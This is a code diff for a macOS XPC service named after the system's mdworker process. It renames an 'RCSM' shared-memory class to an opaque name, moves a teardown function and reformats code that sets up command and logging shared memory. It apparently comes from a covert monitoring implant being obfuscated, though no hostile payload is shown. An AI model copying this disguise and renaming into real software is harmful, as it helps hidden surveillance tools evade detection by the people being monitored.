@@ -17,8 +17,29 @@
 
 int gMemLogMaxSize     = 0x302460;
 int gMemCommandMaxSize = 0x4000;
-RCSMSharedMemory *gSharedMemoryCommand = nil;
-RCSMSharedMemory *gSharedMemoryLogging = nil;
+__m_MSharedMemory *gSharedMemoryCommand = nil;
+__m_MSharedMemory *gSharedMemoryLogging = nil;
+
+static void killingService()
+{
+#ifdef DEBUG_XPC
+  NSLog(@"%s: killing xpc service", __FUNCTION__);
+#endif
+  
+  if (gSharedMemoryCommand)
+  {
+    [gSharedMemoryCommand detachFromMemoryRegion];
+    [gSharedMemoryCommand release];
+    gSharedMemoryCommand = nil;
+  }
+  
+  if (gSharedMemoryLogging) 
+  {
+    [gSharedMemoryLogging detachFromMemoryRegion];
+    [gSharedMemoryLogging release];
+    gSharedMemoryLogging = nil;
+  }
+}
 
 static BOOL initSharedMemory()
 {
@@ -30,36 +51,36 @@ static BOOL initSharedMemory()
   
   gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MAX_NUM_BLOCKS;
   
-  gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
-                                                          size: gMemCommandMaxSize
-                                                 semaphoreName: SHMEM_SEM_NAME];
+  gSharedMemoryCommand = [[__m_MSharedMemory alloc] initWithKey: memKeyForCommand
+                                                           size: gMemCommandMaxSize
+                                                  semaphoreName: SHMEM_SEM_NAME];
   
   if (gSharedMemoryCommand && [gSharedMemoryCommand createMemoryRegion] == -1)
-    {
+  {
 #ifdef DEBUG_XPC
-      NSLog(@"%s: Error while creating shared memory for commands", __func__);
+    NSLog(@"%s: Error while creating shared memory for commands", __func__);
 #endif
-
-      [gSharedMemoryCommand release];
-
-      return NO;
-    }
+    
+    [gSharedMemoryCommand release];
+    
+    return NO;
+  }
   
-  gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
-                                                          size: gMemLogMaxSize
-                                                 semaphoreName: SHMEM_SEM_NAME];
+  gSharedMemoryLogging = [[__m_MSharedMemory alloc] initWithKey: memKeyForLogging
+                                                           size: gMemLogMaxSize
+                                                  semaphoreName: SHMEM_SEM_NAME];
   
   if (gSharedMemoryLogging && [gSharedMemoryLogging createMemoryRegion] == -1)
-    {
+  {
 #ifdef DEBUG_XPC
-      NSLog(@"%s: Error while creating shared memory for logging", __FUNCTION__);
+    NSLog(@"%s: Error while creating shared memory for logging", __FUNCTION__);
 #endif
-
-      [gSharedMemoryCommand release];
-      [gSharedMemoryLogging release];
-
-      return NO;
-    }
+    
+    [gSharedMemoryCommand release];
+    [gSharedMemoryLogging release];
+    
+    return NO;
+  }
   
   //
   // Now it's safe to attach
@@ -212,27 +233,6 @@ static void mdworker_server_event_handler(xpc_connection_t peer)
                                    });
   
 	xpc_connection_resume(peer);
-}
-
-static void killingService()
-{
-#ifdef DEBUG_XPC
-  NSLog(@"%s: killing xpc service", __FUNCTION__);
-#endif
-  
-  if (gSharedMemoryCommand)
-    {
-      [gSharedMemoryCommand detachFromMemoryRegion];
-      [gSharedMemoryCommand release];
-      gSharedMemoryCommand = nil;
-    }
-  
-  if (gSharedMemoryLogging) 
-    {
-      [gSharedMemoryLogging detachFromMemoryRegion];
-      [gSharedMemoryLogging release];
-      gSharedMemoryLogging = nil;
-    }
 }
 
 int main(int argc, const char *argv[])
